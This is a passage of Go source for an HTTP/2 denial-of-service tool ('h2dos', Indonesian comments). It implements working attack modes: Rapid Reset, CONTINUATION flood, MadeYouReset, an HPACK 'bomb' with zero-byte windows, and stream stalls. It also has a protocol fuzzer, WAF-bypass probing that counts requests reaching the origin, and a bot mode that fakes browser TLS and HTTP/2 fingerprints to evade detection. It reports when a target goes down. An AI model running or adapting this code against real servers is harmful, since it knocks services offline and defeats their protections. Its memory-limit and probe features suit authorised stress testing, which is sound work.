	{"prio-self", "PRIORITY bergantung pada dirinya sendiri"},
	{"prio-closed", "PRIORITY ke stream yang sudah ditutup"},
	{"reset-bad", "RST_STREAM kode tak dikenal"},
	{"ping-short", "PING payload 7 byte"},
	{"pong-unsol", "PING ACK tak diminta"},
	{"gu-badstream", "GOAWAY stream id ganjil"},
	{"gu-big", "GOAWAY last-stream = 2^31"},
	{"unknown-fr", "tipe frame tak dikenal"},
	{"gu-hello", "preface diulang di tengah sesi"},
	{"hpack-bidx", "indeks HPACK 0"},
	{"hpack-hi", "indeks HPACK 4096"},
	{"hpack-upd", "dynamic table overflow"},
	{"hpack-zlen", "string HPACK panjang 0"},
	{"frame-bad", "frame acak (mutasi)"},
}

// applyFez mengirim anomali terpilih ke koneksi. Mengembalikan error bila frame
// cacat sampai ditolak mentah-mentah oleh stack TLS/socket.
func applyFez(id string, bw *bufio.Writer, c net.Conn, st *stats, stream uint32, blk []byte) error {
	switch id {
	case "sett-id":
		return writeFrame(bw, frSettings, 0, 0, []byte{0x0f, 0xff, 0, 0, 0, 1})
	case "sett-hts":
		return writeFrame(bw, frSettings, 0, 0, []byte{0, 1, 0x80, 0, 0, 0})
	case "sett-mfs":
		return writeFrame(bw, frSettings, 0, 0, []byte{0, 5, 0, 0, 0, 0})
	case "sett-mfs2":
		return writeFrame(bw, frSettings, 0, 0, []byte{0, 5, 0x40, 1, 0, 1})
	case "sett-iws":
		return writeFrame(bw, frSettings, 0, 0, []byte{0, 4, 0x80, 0, 0, 0})
	case "sett-dup":
		for i := 0; i < 4; i++ {
			if err := writeFrame(bw, frSettings, 0, 0, settingsPayload(0x3, 3)); err != nil {
				return err
			}
		}
		return nil
	case "wu-zero":
		return writeFrame(bw, frWindowUpdate, 0, stream, []byte{0, 0, 0, 0})
	case "wu-big":
		return writeFrame(bw, frWindowUpdate, 0, 0, []byte{0x80, 0, 0, 0})
	case "data-closed":
		if err := writeFrame(bw, frHeaders, flEndHeaders|flEndStream, stream, blk); err != nil {
			return err
		}
		return writeFrame(bw, frData, flEndStream, stream, []byte("xxxx"))
	case "data-conn":
		return writeFrame(bw, frData, 0, 0, []byte("halo"))
	case "data-big":
		return writeFrame(bw, frData, 0, stream, make([]byte, 1<<17))
	case "hdr-even":
		return writeFrame(bw, frHeaders, flEndHeaders|flEndStream, stream+1, blk)
	case "hdr-zero":
		return writeFrame(bw, frHeaders, flEndHeaders|flEndStream, 0, blk)
	case "hdr-empty":
		return writeFrame(bw, frHeaders, flEndHeaders|flEndStream, stream, nil)
	case "cont-solo":
		return writeFrame(bw, frContinuation, flEndHeaders, stream, blk)
	case "cont-zero":
		return writeFrame(bw, frContinuation, 0, stream, nil)
	case "cont-badstream":
		return writeFrame(bw, frContinuation, flEndHeaders, 0, blk)
	case "prio-self":
		b := []byte{byte(stream >> 24), byte(stream >> 16), byte(stream >> 8), byte(stream), 0, 16}
		return writeFrame(bw, frPriority, 0, stream, b)
	case "prio-closed":
		b := []byte{0, 0, 0, 0, 0, 16}
		return writeFrame(bw, frPriority, 0, stream, b)
	case "reset-bad":
		if err := writeFrame(bw, frHeaders, flEndHeaders|flEndStream, stream, blk); err != nil {
			return err
		}
		return writeFrame(bw, frReset, 0, stream, []byte{0, 0, 0x99, 0x99})
	case "ping-short":
		return writeFrame(bw, frPing, 0, 0, []byte{1, 2, 3, 4, 5, 6, 7})
	case "pong-unsol":
		return writeFrame(bw, frPing, flAck, 0, []byte{1, 2, 3, 4, 5, 6, 7, 8})
	case "gu-badstream":
		return writeFrame(bw, frGoaway, 0, 0, []byte{0, 0, 0, 3, 0, 0, 0, 0})
	case "gu-big":
		return writeFrame(bw, frGoaway, 0, 0, []byte{0x7f, 0xff, 0xff, 0xff, 0, 0, 0, 0})
	case "unknown-fr":
		return writeFrame(bw, 0x2c, 0, stream, []byte{1, 2, 3})
	case "gu-hello":
		if err := writeFrame(bw, frHeaders, flEndHeaders|flEndStream, stream, blk); err != nil {
			return err
		}
		_, err := io.WriteString(bw, preface)
		return err
	case "hpack-bidx":
		return writeFrame(bw, frHeaders, flEndHeaders|flEndStream, stream,
			[]byte{0x10, 0x00, 0x03, 'x', 'y', 'z'})
	case "hpack-hi":
		return writeFrame(bw, frHeaders, flEndHeaders|flEndStream, stream,
			[]byte{0x80, 0x80, 0x40})
	case "hpack-upd":
		b := []byte{0x3f, 0xff, 0xff, 0xff, 0xff, 0x0f}
		b = append(b, blk...)
		return writeFrame(bw, frHeaders, flEndHeaders|flEndStream, stream, b)
	case "hpack-zlen":
		return writeFrame(bw, frHeaders, flEndHeaders|flEndStream, stream, []byte{0x10, 0x00, 0x00})
	case "frame-bad":
		n := 1 + lastFezLoad()%12
		p := make([]byte, n)
		for i := range p {
			p[i] = byte(lastFezLoad()>>uint(i%8)) ^ byte(i*7)
		}
		return writeFrame(bw, byte(1+lastFezLoad()%12), byte(lastFezLoad()%64), stream, p)
	}
	return nil
}

func lastFezLoad() int64 { return lastFez.Load() }

// h2SendOne membuka satu koneksi, mengirim satu request, dan menunggu :status.
// Dipakai untuk uji bypass (perlu kode balasan, bukan sekadar hitungan).
func h2SendOne(c *Config, blk []byte, timeout time.Duration) (int, error) {
	st := &stats{}
	conn, err := dial(context.Background(), st, nil)
	if err != nil {
		return 0, err
	}
	defer conn.Close()
	_ = conn.SetDeadline(time.Now().Add(timeout))
	bw := bufio.NewWriterSize(conn, 32*1024)
	if _, err := io.WriteString(bw, preface); err != nil {
		return 0, err
	}
	if err := writeFrame(bw, frSettings, 0, 0, settingsPayload(0x1, 4096, 0x4, 1<<20)); err != nil {
		return 0, err
	}
	if err := writeFrame(bw, frHeaders, flEndHeaders|flEndStream, 1, blk); err != nil {
		return 0, err
	}
	if err := bw.Flush(); err != nil {
		return 0, err
	}
	connCredit(conn, 1<<30-1)
	hdr := make([]byte, 9)
	for {
		if _, err := io.ReadFull(conn, hdr); err != nil {
			return 0, err
		}
		n := int(hdr[0])<<16 | int(hdr[1])<<8 | int(hdr[2])
		typ, flags := hdr[3], hdr[4]
		if n > 1<<22 {
			return 0, errors.New("frame terlalu besar")
		}
		p := make([]byte, n)
		if n > 0 {
			if _, err := io.ReadFull(conn, p); err != nil {
				return 0, err
			}
		}
		switch typ {
		case frHeaders:
			if flags&flEndHeaders != 0 {
				hf, err := hpackDecode(p)
				if err != nil {
					return 0, fmt.Errorf("HEADERS tidak terbaca: %w", err)
				}
				if code := statusOf(hf); code != 0 {
					return code, nil
				}
				return 0, errors.New("respons tanpa :status")
			}
		case frSettings:
			if flags&flAck == 0 {
				_ = writeFrame(conn, frSettings, flAck, 0, nil)
			}
		case frPing:
			if flags&flAck == 0 {
				_ = writeFrame(conn, frPing, flAck, 0, p[:8])
			}
		case frGoaway:
			code := uint32(0)
			if len(p) >= 8 {
				code = uint32(p[4])<<24 | uint32(p[5])<<16 | uint32(p[6])<<8 | uint32(p[7])
			}
			return 0, fmt.Errorf("GOAWAY %s", goawayNames[code])
		}
		if n > 0 {
			connCredit(conn, uint32(n))
		}
	}
}

// verdict bypass: apa arti kode yang kembali.
func verdict(code int, err error) string {
	if err != nil {
		return "KONEKSI DITUTUP"
	}
	switch {
	case code >= 200 && code < 400:
		return "TEMBUS origin"
	case code == 403 || code == 406:
		return "DITOLAK WAF"
	case code == 429:
		return "RATE LIMIT"
	case code >= 500:
		return "origin ERROR"
	default:
		return fmt.Sprintf("kode %d", code)
	}
}

// bypassSelftest mencoba setiap teknik sekali dan mencetak hasilnya, supaya
// klaim "bypass" bisa diukur, bukan dikira-kira.
func bypassSelftest(c *Config) {
	techs := enabledTechs()
	fmt.Printf("\nUji bypass ke %s (%d teknik, 1 request masing-masing):\n", c.target, len(techs))
	var tembus, ditolak, error int
	for k, id := range techs {
		r := rand.New(rand.NewPCG(uint64(time.Now().UnixNano()), uint64(k+1)))
		blk := bypassBlock(id, c, r, k)
		code, err := h2SendOne(c, blk, cfg.probeTO+2*time.Second)
		res := fmt.Sprintf("HTTP %d", code)
		if err != nil {
			res = err.Error()
			error++
		} else if code >= 200 && code < 400 {
			tembus++
		} else {
			ditolak++
		}
		fmt.Printf("  %-10s %-24s %-18s %s\n", id, res, verdict(code, err), techName(id))
	}
	fmt.Printf("ringkasan: %d tembus origin, %d ditolak/limit, %d koneksi ditutup\n\n",
		tembus, ditolak, error)
}

func techName(id string) string {
	for _, t := range bypassTechs {
		if t.id == id {
			return t.nama
		}
	}
	return ""
}

// enabledTechs mendaftar teknik bypass yang aktif (-bypass).
func enabledTechs() []string {
	if len(cfg.bypass) == 0 {
		out := make([]string, 0, len(bypassTechs))
		for _, t := range bypassTechs {
			out = append(out, t.id)
		}
		return out
	}
	seen := map[string]bool{}
	var out []string
	for _, s := range cfg.bypass {
		if !seen[s] {
			seen[s] = true
			out = append(out, s)
		}
	}
	return out
}

// pickBypass memilih teknik bypass acak dari daftar yang aktif.
func pickBypass(r *rand.Rand) string {
	t := enabledTechs()
	if len(t) == 0 {
		return "plain"
	}
	return t[r.IntN(len(t))]
}

// enabledFez mendaftar teknik fez yang aktif (-fez-only).
func enabledFez() []string {
	if len(cfg.fezOnly) == 0 {
		out := make([]string, 0, len(fezTechs))
		for _, t := range fezTechs {
			out = append(out, t.id)
		}
		return out
	}
	seen := map[string]bool{}
	var out []string
	for _, s := range cfg.fezOnly {
		if !seen[s] {
			seen[s] = true
			out = append(out, s)
		}
	}
	return out
}

func fezName(id string) string {
	for _, t := range fezTechs {
		if t.id == id {
			return t.nama
		}
	}
	return id
}

// pickFez memilih anomali fez secara acak, disimpan di lastFez supaya GOAWAY
// yang datang bisa dikaitkan dengan pemicunya.
func pickFez(r *rand.Rand) string {
	t := enabledFez()
	if len(t) == 0 {
		return "frame-bad"
	}
	id := t[r.IntN(len(t))]
	for i, f := range fezTechs {
		if f.id == id {
			lastFez.Store(int64(i))
			break
		}
	}
	return id
}

func fezID() string {
	i := int(lastFez.Load())
	if i < 0 || i >= len(fezTechs) {
		return "?"
	}
	return fezTechs[i].id
}

// printBypassList / printFezList mencetak katalog teknik.
func printBypassList() {
	fmt.Println("teknik bypass HTTP/2 (-bypass nama):")
	for _, t := range bypassTechs {
		fmt.Printf("  %-10s %-32s %s\n", t.id, t.nama, t.guna)
	}
}

func printFezList() {
	fmt.Println("anomali fez HTTP/2 (-fez-only nama):")
	for i, t := range fezTechs {
		fmt.Printf("  %2d. %-14s %s\n", i, t.id, t.nama)
	}
}

// ---------------- worker per koneksi ----------------

// fezNow adalah teknik yang sedang dipakai koneksi berjalan, dibaca readLoop
// saat mencatat reaksi server.
var fezNow atomic.Value

// bypassNow adalah teknik bypass yang sedang dipakai koneksi berjalan.
var bypassNow atomic.Value

func nowTech() string {
	switch cfg.mode {
	case "fez":
		if v, ok := fezNow.Load().(string); ok && v != "" {
			return v
		}
	case "bypass":
		if v, ok := bypassNow.Load().(string); ok && v != "" {
			return v
		}
	}
	return ""
}

func worker(ctx context.Context, st *stats, lim *bucket, id int) {
	for {
		if ctx.Err() != nil {
			return
		}
		err := serveConn(ctx, st, lim, id)
		if ctx.Err() != nil {
			return
		}
		if t := nowTech(); t != "" {
			switch {
			case errors.Is(err, errGoaway):
				catatReaksi(t, "GOAWAY")
			case err == nil:
				catatReaksi(t, "koneksi ditutup diam-diam")
			default:
				catatReaksi(t, "galat: "+err.Error())
			}
		}
		if errors.Is(err, errGoaway) || err == nil {
			continue // koneksi ditutup lawan: ganti baru
		}
		select {
		case <-ctx.Done():
			return
		case <-time.After(100 * time.Millisecond):
		}
	}
}

func serveConn(ctx context.Context, st *stats, lim *bucket, id int) error {
	if err := connLim.wait(ctx, 1); err != nil {
		return err
	}
	var profSel *prof
	if cfg.mode == "bot" {
		profSel = pickProfile(rand.New(rand.NewPCG(uint64(time.Now().UnixNano()), uint64(id+7))))
	}
	c, err := dial(ctx, st, profSel)
	if err != nil {
		return err
	}
	defer c.Close()
	st.connsUp.Add(1)
	st.connsLive.Add(1)
	defer st.connsLive.Add(-1)

	m := &connMeta{}
	m.maxStreams.Store(int64(cfg.streams))
	m.maxFrame.Store(16384)
	ctl := make(chan []byte, 32)
	rerr := make(chan error, 1)
	go func() { rerr <- readLoop(c, st, m, ctl) }()

	cw := &countConn{c: c}
	bw := bufio.NewWriterSize(cw, cfg.buf)
	flush := func() error {
		_ = c.SetWriteDeadline(time.Now().Add(cfg.writeTO))
		err := bw.Flush()
		_ = c.SetWriteDeadline(time.Time{})
		st.out.Add(cw.n.Swap(0))
		return err
	}

	iw := int64(cfg.initWindow)
	if iw < 0 {
		iw = 1 << 20
		if cfg.mode == "bomb" || cfg.mode == "stall" {
			iw = 0
		}
	}
	if _, err := io.WriteString(bw, preface); err != nil {
		return err
	}
	if cfg.mini {
		if err := writeFrame(bw, frSettings, 0, 0, nil); err != nil {
			return err
		}
	} else if profSel != nil {
		if err := writeFrame(bw, frSettings, 0, 0, profSel.settings()); err != nil {
			return err
		}
	} else if err := writeFrame(bw, frSettings, 0, 0, settingsPayload(0x1, 0, settingMaxConns, 100000, 0x4, uint32(iw))); err != nil {
		return err
	}
	if err := flush(); err != nil {
		return err
	}
	// Beri server jendela KIRIM yang besar (kita default 65.535 byte). Modus
	// bomb/stall sengaja TIDAK melakukan ini: jendela 0 byte adalah senjatanya.
	if !holdWindow.Load() {
		connCredit(c, 1<<30-1)
	}

	rnd := rand.New(rand.NewPCG(uint64(time.Now().UnixNano())^uint64(id+1), uint64(id+1)))
	var bld reqBuilder = &plainBld{b: newBuilder(&cfg)}
	var fezTech, bypassTech string
	var bypassVary int
	switch cfg.mode {
	case "bot":
		paths := cfg.botPaths
		if len(paths) == 0 {
			paths = []string{cfg.path}
		}
		bld = &botBld{inner: newBrowserBld(profSel, &cfg, paths, rnd)}
	case "fez":
		fezTech = pickFez(rnd)
		fezNow.Store(fezTech)
	case "bypass":
		bypassTech = pickBypass(rnd)
		bypassVary = rnd.IntN(64)
		bld = &bypassBld{tech: bypassTech, vary: bypassVary}
		bypassNow.Store(bypassTech)
	}
	seedBlob := hpackInsert(cfg.bombName, cfg.bombValue)
	refsBlob := make([]byte, cfg.bombRefs)
	for i := range refsBlob {
		refsBlob[i] = 0x80 | 62
	}
	var seeded bool

	contBlob := make([]byte, 0, 65536)
	if cfg.contRandom {
		contBlob = append(contBlob, make([]byte, 65536)...)
		for i := range contBlob {
			contBlob[i] = byte(rnd.Uint32())
		}
	} else {
		contBlob = append(contBlob, 0x10, 0x7f, 0x1f)
		contBlob = append(contBlob, strings.Repeat("a", 4095)...)
		contBlob = append(contBlob, 0x7f, 0x1f)
		contBlob = append(contBlob, strings.Repeat("b", 4095)...)
	}
	var contOff int

	var stream uint32 = 1
	var sent, sinceRecycle int
	var hang uint32
	var pinned []uint32
	var bodyBlob []byte
	if cfg.body != "" {
		bodyBlob = []byte(cfg.body)
	}

	capOf := func() int64 {
		ms := m.maxStreams.Load()
		if int64(cfg.streams) < ms {
			ms = int64(cfg.streams)
		}
		return ms
	}
	nextStream := func(n uint32) (uint32, error) {
		if stream > 1<<30 {
			return 0, errors.New("kehabisan nomor stream")
		}
		s := stream
		stream += n * 2
		return s, nil
	}
	waitSlot := func(ctx context.Context, n int64) error {
		if cfg.debug && m.openStreams.Load()+n > capOf() {
			fmt.Fprintf(os.Stderr, "[dbg] waitSlot buka=%d n=%d cap=%d\n", m.openStreams.Load(), n, capOf())
		}
		for m.openStreams.Load()+n > capOf() {
			select {
			case <-ctx.Done():
				return ctx.Err()
			case err := <-rerr:
				return err
			case <-ctl:
				_ = writeFrame(bw, frSettings, flAck, 0, nil)
				if err := flush(); err != nil {
					st.errCat("write", err)
					return err
				}
			case <-time.After(20 * time.Millisecond):
			}
		}
		return nil
	}

	for {
		select {
		case <-ctx.Done():
			return ctx.Err()
		case err := <-rerr:
			if errors.Is(err, errGoaway) {
				st.errCat("goaway", err)
			}
			return err
		case <-ctl:
			_ = writeFrame(bw, frSettings, flAck, 0, nil)
			if err := flush(); err != nil {
				st.errCat("write", err)
				return err
			}
		default:
		}

		if cfg.recycle > 0 && sinceRecycle >= cfg.recycle {
			st.errCat("rotasi", errors.New("rotasi koneksi"))
			return nil
		}

		if cfg.debug {
			fmt.Fprintf(os.Stderr, "[dbg] loop mode=%s sent=%d cap=%d open=%d\n", cfg.mode, sent, capOf(), m.openStreams.Load())
		}
		switch cfg.mode {
		case "flood", "reset", "bot", "fez", "bypass":
			// jaga agar stream yang dibuka tidak jauh melewati batas server:
			// tunggu sampai slot longgar untuk seluruh batch.
			if err := waitSlot(ctx, int64(cfg.batch)); err != nil {
				return err
			}
			// Kirim banyak HEADERS sekaligus (batch), flush sekali.
			s, err := nextStream(uint32(cfg.batch))
			if err != nil {
				return err
			}
			var n int
			hdrFlags := byte(flEndHeaders | flEndStream)
			for i := 0; i < cfg.batch; i++ {
				if bw.Available() < 1024 {
					break
				}
				hp := bld.next(rnd, cfg.path)
				dumpBlock(hp)
				if cfg.debug && sent == 0 {
					fmt.Printf("[dbg] blok ke-0 = %d byte: % X\n", len(hp), hp)
				}
				if err := writeFrame(bw, frHeaders, hdrFlags, s+uint32(2*i), hp); err != nil {
					st.errCat("write", err)
					return err
				}
				if len(bodyBlob) > 0 {
					if err := writeFrame(bw, frData, flEndStream, s+uint32(2*i), bodyBlob); err != nil {
						st.errCat("write", err)
						return err
					}
				}
				if cfg.mode == "reset" {
					if err := writeFrame(bw, frReset, 0, s+uint32(2*i), []byte{0, 0, 0, 0}); err != nil {
						st.errCat("write", err)
						return err
					}
				}
				if cfg.mode == "fez" && fezTech != "" {
					if err := applyFez(fezTech, bw, c, st, s+uint32(2*i), hp); err != nil {
						st.errCat("write", err)
						return err
					}
				}
				n++
			}
			if n == 0 {
				if err := flush(); err != nil {
					st.errCat("write", err)
					return err
				}
				continue
			}
			if err := flush(); err != nil {
				st.errCat("write", err)
				return err
			}
			if cfg.mode == "flood" {
				m.openStreams.Add(int64(n))
			}
			st.reqs.Add(int64(n))
			sent += n
			sinceRecycle += n
			if err := lim.wait(ctx, float64(n)); err != nil {
				return err
			}
			switch cfg.mode {
			case "bot":
				// browser mengirim sedikit permintaan lalu menunggu: flush
				// sekarang, jangan tumpuk di buffer sampai penuh
				if err := flush(); err != nil {
					st.errCat("write", err)
					return err
				}
				// browser mengirim lalu menulis ke socket: flush sekarang,
				// jangan ditahan di buffer sampai penuh
				if err := flush(); err != nil {
					st.errCat("write", err)
					return err
				}
				// jeda berpikir ala manusia: beban datang dari BANYAK koneksi
				// baru, bukan dari request cepat per koneksi
				d := cfg.botThink
				if d > 0 {
					if cfg.botThinkJit > 0 {
						d += time.Duration(rnd.IntN(int(cfg.botThinkJit))) - cfg.botThinkJit/2
					}
					if d < 0 {
						d = 0
					}
					select {
					case <-ctx.Done():
						return ctx.Err()
					case err := <-rerr:
						return err
					case <-time.After(d):
					}
				}
			case "fez":
				if cfg.recycle > 0 && sent >= cfg.recycle {
					if st.resp.Load() > 0 {
						catatReaksi(fezTech, "masih melayani respons")
					}
					return nil // ganti koneksi + ganti teknik anomali
				}
			case "bypass":
				bypassVary++
				if cfg.recycle > 0 && sent >= cfg.recycle {
					catatReaksi(bypassTech, fmt.Sprintf("request diterima (%d resp)", st.resp.Load()))
					return nil // satu koneksi per teknik agar bersih
				}
			}
			continue
		case "bomb", "stall":
			if int64(len(pinned)) < capOf() {
				for m.openStreams.Load() > capOf() {
					select {
					case <-ctx.Done():
						return ctx.Err()
					case err := <-rerr:
						return err
					case <-ctl:
						_ = writeFrame(bw, frSettings, flAck, 0, nil)
						if err := flush(); err != nil {
							st.errCat("write", err)
							return err
						}
					case <-time.After(20 * time.Millisecond):
					}
				}
				s, err := nextStream(1)
				if err != nil {
					return err
				}
				hp := bld.next(rnd, cfg.path)
				if cfg.mode == "bomb" {
					if !seeded {
						hp = append(hp, seedBlob...)
						seeded = true
					} else {
						hp = append(hp, refsBlob...)
					}
				}
				if err := writeFrame(bw, frHeaders, flEndHeaders|flEndStream, s, hp); err != nil {
					st.errCat("write", err)
					return err
				}
				pinned = append(pinned, s)
				m.inflight.Add(1)
				st.reqs.Add(1)
				sent++
				sinceRecycle++
				if err := lim.wait(ctx, 1); err != nil {
					return err
				}
				break
			}
			// slot penuh: jaga stream tetap hidup dengan kredit 1 byte
			for _, s := range pinned {
				if err := writeFrame(bw, frWindowUpdate, 0, s, oneByte); err != nil {
					st.errCat("write", err)
					return err
				}
			}
			if err := flush(); err != nil {
				st.errCat("write", err)
				return err
			}
			select {
			case <-ctx.Done():
				return ctx.Err()
			case err := <-rerr:
				return err
			case <-time.After(cfg.stallIv):
			}
			continue
		case "myreset":
			s, err := nextStream(1)
			if err != nil {
				return err
			}
			hp := bld.next(rnd, cfg.path)
			if err := writeFrame(bw, frHeaders, flEndHeaders|flEndStream, s, hp); err != nil {
				st.errCat("write", err)
				return err
			}
			switch cfg.myrPrim {
			case "window":
				if err := writeFrame(bw, frWindowUpdate, 0, s, zeroByte); err != nil {
					st.errCat("write", err)
					return err
				}
			case "priority":
				if err := writeFrame(bw, frPriority, 0, s, zeroByte); err != nil {
					st.errCat("write", err)
					return err
				}
			default:
				if err := writeFrame(bw, frData, 0, s, []byte{0x2e}); err != nil {
					st.errCat("write", err)
					return err
				}
			}
			st.reqs.Add(1)
			sent++
			sinceRecycle++
			if err := lim.wait(ctx, 1); err != nil {
				return err
			}
			if bw.Available() < 1024 {
				if err := flush(); err != nil {
					st.errCat("write", err)
					return err
				}
			}
		case "contflood":
			if hang == 0 {
				s, err := nextStream(1)
				if err != nil {
					return err
				}
				hang = s
				if err := writeFrame(bw, frHeaders, 0, s, contBlob[:6]); err != nil {
					st.errCat("write", err)
					return err
				}
				st.reqs.Add(1)
				sent++
			}
			n := len(contBlob)
			if mf := int(m.maxFrame.Load()); mf < n {
				n = mf
			}
			if cfg.contSize < n {
				n = cfg.contSize
			}
			var fr int64
			for bw.Available() > n+1024 {
				if contOff+n > len(contBlob) {
					contOff = 0
				}
				if err := writeFrame(bw, frContinuation, 0, hang, contBlob[contOff:contOff+n]); err != nil {
					st.errCat("write", err)
					return err
				}
				contOff += n
				fr++
			}
			st.frames.Add(fr)
			if err := flush(); err != nil {
				st.errCat("write", err)
				return err
			}
			if err := lim.wait(ctx, float64(fr)); err != nil {
				return err
			}
			continue
		}
		_ = sent
		if bw.Available() < 4096 {
			if err := flush(); err != nil {
				st.errCat("write", err)
				return err
			}
		}
	}
}

// ---------------- alat ukur ----------------

// rssTotal menjumlahkan VmRSS (kB) untuk proses dengan nama/PID yang diminta.
func rssTotal(watch string) (int64, int) {
	if watch == "" {
		return 0, 0
	}
	var total int64
	matched := 0
	readOne := func(pid string) {
		b, err := os.ReadFile("/proc/" + pid + "/status")
		if err != nil {
			return
		}
		for _, line := range strings.Split(string(b), "\n") {
			if strings.HasPrefix(line, "VmRSS:") {
				f := strings.Fields(line)
				if len(f) >= 2 {
					if kb, err := strconv.ParseInt(f[1], 10, 64); err == nil {
						total += kb
						matched++
					}
				}
				return
			}
		}
	}
	if _, err := strconv.Atoi(watch); err == nil {
		readOne(watch)
		return total, matched
	}
	procs, err := os.ReadDir("/proc")
	if err != nil {
		return 0, 0
	}
	for _, p := range procs {
		name := p.Name()
		if _, err := strconv.Atoi(name); err != nil {
			continue
		}
		c, err := os.ReadFile("/proc/" + name + "/comm")
		if err != nil || strings.TrimSpace(string(c)) != watch {
			continue
		}
		readOne(name)
	}
	return total, matched
}

func rssWatch(ctx context.Context, st *stats, cancel context.CancelFunc) {
	tick := time.NewTicker(500 * time.Millisecond)
	defer tick.Stop()
	warned := false
	for {
		select {
		case <-ctx.Done():
			return
		case <-tick.C:
		}
		kb, n := rssTotal(cfg.rss)
		if n == 0 {
			if !warned {
				fmt.Fprintf(os.Stderr, "h2dos: proses %q tidak ditemukan di /proc, kolom RAM kosong\n", cfg.rss)
				warned = true
			}
			continue
		}
		st.rssKB.Store(kb)
		if kb > st.peakRssKB.Load() {
			st.peakRssKB.Store(kb)
		}
		if cfg.maxRSS > 0 && float64(kb)/1024 >= cfg.maxRSS {
			fmt.Printf("[RAM] target sudah %.0f MB (>= -max-rss %.0f MB) -> serangan dihentikan\n",
				float64(kb)/1024, cfg.maxRSS)
			cancel()
			return
		}
	}
}

func probeURL() string {
	if strings.HasPrefix(cfg.probe, "http://") || strings.HasPrefix(cfg.probe, "https://") {
		return cfg.probe
	}
	p := cfg.probe
	if p == "" {
		p = "/"
	}
	if !strings.HasPrefix(p, "/") {
		p = "/" + p
	}
	return fmt.Sprintf("%s://%s%s", cfg.scheme, cfg.hostHdr, p)
}

func probeReason(st *stats) string {
	switch c := st.probeCode.Load(); {
	case c == -1:
		return "konek/gagal"
	case c > 0:
		return fmt.Sprintf("HTTP %d", c)
	default:
		return "-"
	}
}

// probeLoop menguji ketersediaan target (h2 lewat ALPN).
func probeLoop(ctx context.Context, st *stats, u string, cancel context.CancelFunc) {
	tr := &http.Transport{
		TLSClientConfig:    &tls.Config{InsecureSkipVerify: cfg.insecure},
		ForceAttemptHTTP2:  true,
		DisableCompression: true,
		DisableKeepAlives:  cfg.probeFresh,
		MaxConnsPerHost:    1,
	}
	defer tr.CloseIdleConnections()
	cl := &http.Client{Timeout: cfg.probeTO, Transport: tr}
	st.probeOK.Store(true)
	fails := 0
	downAt := time.Time{}
	tick := time.NewTicker(cfg.probeIv)
	defer tick.Stop()
	for {
		select {
		case <-ctx.Done():
			return
		case <-tick.C:
		}
		cctx, cn := context.WithTimeout(ctx, cfg.probeTO)
		req, err := http.NewRequestWithContext(cctx, http.MethodHead, u, nil)
		if err != nil {
			cn()
			continue
		}
		t0 := time.Now()
		resp, err := cl.Do(req)
		st.probeMS.Store(time.Since(t0).Milliseconds())
		bad := err != nil
		code := 0
		if !bad {
			code = resp.StatusCode
			_ = resp.Body.Close()
			if len(cfg.badCodes) > 0 {
				bad = cfg.badCodes[code]
			} else {
				bad = code >= 500
			}
		} else {
			st.probeCode.Store(-1)
		}
		cn()
		if !bad {
			st.probeCode.Store(int64(code))
			if !downAt.IsZero() {
				fmt.Printf("[PULIH] target melayani lagi (HTTP %d), lama gangguan %.1fs\n",
					code, time.Since(downAt).Seconds())
				downAt = time.Time{}
			}
			fails = 0
			st.probeOK.Store(true)
			continue
		}
		st.probeCode.Store(int64(code))
		fails++
		if fails == cfg.probeFail && downAt.IsZero() {
			downAt = time.Now()
			st.probeOK.Store(false)
			fmt.Printf("[DOWN] target berhenti melayani setelah %.1fs serangan (%d uji gagal berturut-turut, %s)\n",
				time.Since(started).Seconds(), cfg.probeFail, probeReason(st))
			if cfg.stopOnDown {
				fmt.Println("[DOWN] serangan dihentikan (matikan -stop-on-down untuk melanjutkan)")
				cancel()
				return
			}
		}
	}
}

func reporter(ctx context.Context, st *stats) {
	t := time.NewTicker(cfg.interval)
	defer t.Stop()
	var lastReqs, lastOut, lastConns int64
	var lastTime = time.Now()
	fmt.Printf("%-6s %10s %8s %9s %7s %11s %8s %12s  %s\n",
		"WAKTU", "REQ", "RPS", "RESP", "KIRIM", "KONEKSI", "RAM", "UJI", "ERROR")
	for {
		select {
		case <-ctx.Done():
			return
		case <-t.C:
		}
		reqs, resp, _, errs := st.snapshot()
		out := st.out.Load()
		ram, uji := "-", "-"
		if cfg.rss != "" {
			ram = fmt.Sprintf("%.0fM", float64(st.rssKB.Load())/1024)
		}
		if cfg.probe != "" {
			if st.probeOK.Load() {
				uji = fmt.Sprintf("OK%5dms", st.probeMS.Load())
			} else {
				uji = "DOWN " + probeReason(st)
			}
		}
		now := time.Now()
		dt := now.Sub(lastTime).Seconds()
		rps := float64(reqs-lastReqs) / dt
		mbs := float64(out-lastOut) / 1e6 / dt
		cps := float64(st.connsUp.Load()-lastConns) / dt
		lastConns = st.connsUp.Load()
		if int64(rps) > st.peakRPS.Load() {
			st.peakRPS.Store(int64(rps))
		}
		lastReqs, lastOut, lastTime = reqs, out, now
		koneksi := fmt.Sprintf("%d", st.connsLive.Load())
		if cfg.connRate > 0 {
			koneksi = fmt.Sprintf("%s/%.0f/s", koneksi, cps)
		}
		fmt.Printf("%-6s %10d %8.0f %9d %7.1f %11s %8s %12s  %s\n",
			fmt.Sprintf("%.0fs", now.Sub(started).Seconds()), reqs, rps, resp, mbs,
			koneksi, ram, uji, topErrors(errs, 3))
	}
}

// ---------------- main ----------------

// modeDesc menjelaskan singkat apa yang dilakukan tiap modus.
func modeDesc(m string) string {
	switch m {
	case "bomb":
		return "HTTP/2 Bomb (CVE-2026-49975): referensi HPACK 1-byte + jendela 0 byte"
	case "stall":
		return "window stall: request aset besar ditahan dengan flow control 0 byte"
	case "myreset":
		return "MadeYouReset (CVE-2025-8671): frame cacat memaksa server mengirim RST_STREAM"
	case "contflood":
		return "CONTINUATION Flood (CVE-2024-27316): CONTINUATION tanpa batas di satu stream"
	case "flood":
		return "throughput maksimal: koneksi persisten + stream multiplexed"
	case "reset":
		return "Rapid Reset (CVE-2023-44487): HEADERS lalu RST_STREAM massal"
	case "bot":
		return "bot browser: sidik jari TLS+SETTINGS+HPACK ditiru, banyak koneksi, jeda acak"
	case "fez":
		return "fuzzer kepatuhan h2: anomali frame/SETTINGS/HPACK, peta GOAWAY target"
	case "bypass":
		return "uji teknik bypass WAF lewat HTTP/2 (nama header, duplikasi, enkoding, smuggling)"
	}
	return ""
}

// fezReaksi mencatat reaksi server terhadap tiap teknik fez:
// teknik -> (reaksi -> jumlah). Ini peta kepatuhan target: teknik yang memicu
// kode GOAWAY tidak lazim (atau koneksi hangus) adalah kandidat kerentanan baru.
var fezReaksi = struct {
	sync.Mutex
	m map[string]map[string]int
}{m: map[string]map[string]int{}}

func catatReaksi(tech, reaksi string) {
	fezReaksi.Lock()
	defer fezReaksi.Unlock()
